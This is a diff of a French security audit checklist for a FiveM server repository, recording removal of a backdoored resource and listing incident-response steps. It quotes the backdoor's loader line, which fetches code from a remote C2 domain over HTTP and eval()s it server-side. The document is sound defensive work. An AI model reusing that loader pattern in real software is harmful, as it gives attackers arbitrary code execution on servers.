@@ -7,12 +7,19 @@
 - [x] **thug-killfeeds/html/server.js** — backdoor RCE actif : `require('http').get('http://uabjuza.lt:3000/api/connector/execute/js/SC_...')` → `eval()` de code distant arbitraire, chargé **côté serveur** via `fxmanifest.lua` (`server_scripts{ 'html/*.js' }`). Pas dans `escrow_ignore` = injecté furtivement. Famille de malware loader FiveM connue.
   → ✅ Fichier supprimé (`git rm`) + `'html/*.js'` retiré des server_scripts. **Branche `fix/critical-security`.**
 
-### ⚠️ ACTIONS IR À FAIRE (décisions utilisateur)
-- [ ] **Considérer le serveur comme compromis** depuis l'installation de thug-killfeeds. Le backdoor a pu exécuter n'importe quel code (vol DB, comptes admin, persistance).
-- [ ] **Roter tous les secrets** : tokens Discord/webhooks, clés API, mots de passe DB (`server.cfg`), licence serveur, identifiants steam/admin.
-- [ ] **Auditer les autres ressources non-officielles** d'origine douteuse (même source que thug-killfeeds ?).
-- [ ] **Vérifier la persistance** : tâches cron/services inattendus, fichiers modifiés récemment, comptes admin DB ajoutés, ressources auto-ajoutées à `server.cfg`.
-- [ ] **Décider du sort de thug-killfeeds** : remplacer par une source propre/officielle plutôt que garder un resource trojané (même nettoyé). Webhook hijack `initUrl`/`triggerNotify` toujours présent (voir HIGH).
+### Audit de compromission (sweep complet du repo — fait 2026-06-03)
+- [x] **Recherche stage-1 du loader ailleurs** — domaine C2 `uabjuza`/`api/connector/execute` introuvable hors thug-killfeeds. ✅ Un seul point d'injection.
+- [x] **Scan loaders/eval distants tout le repo** (.js + .lua) — aucun autre. Les hits `PerformHttpRequest`/`loadstring`/`load()` sont tous bénins : version-checks GitHub (viper-emote), lookups steam/discord (vipersquad), webhooks Discord, ACL ox_lib/qb-core.
+- [x] **Configs/clés exposées** — aucun `.cfg`, aucune licence/clé API/mdp DB dans le repo.
+- [x] **ACE/principal abusifs** — aucun. `viper-boutique` `add_principal` = grades VIP achetés (`item.set_group` défini par admin) ; `givecoins` gated console/admin. OK.
+
+### ⚠️ ACTIONS IR — décisions utilisateur (le nettoyage repo ne suffit pas)
+- [ ] **Considérer le serveur comme compromis** depuis l'install de thug-killfeeds — le backdoor a pu exécuter du code en mémoire (le stage-2 eval'd n'est PAS sur disque, donc invisible au repo).
+- [ ] **Roter tous les secrets** : tokens Discord/webhooks, clés API, mdp DB (`server.cfg`), licence serveur (`sv_licenseKey`), identifiants steam/admin.
+- [ ] **Vérifier la persistance hors repo** : `server.cfg` (ressources `ensure` inattendues), tâches planifiées/services Windows, comptes admin ajoutés en DB, fichiers récents sur l'hôte.
+- [ ] **D'où vient thug-killfeeds ?** identifier la source pour repérer d'autres resources de la même origine. Le remplacer par une source propre plutôt que garder un trojan nettoyé.
+- [ ] **xeroshieldv3** (anticheat) — code obfusqué non auditable, aucune signature backdoor trouvée mais non vérifiable à 100%. Confirmer provenance officielle XeroShield.
+- [ ] **[cfx-default]/[system]/runcode** — outil dev d'exécution de code arbitraire (rcon). Vérifier qu'il n'est PAS `ensure` dans `server.cfg` en prod ; sinon le retirer.
 
 ---
 # Reste de l'audit
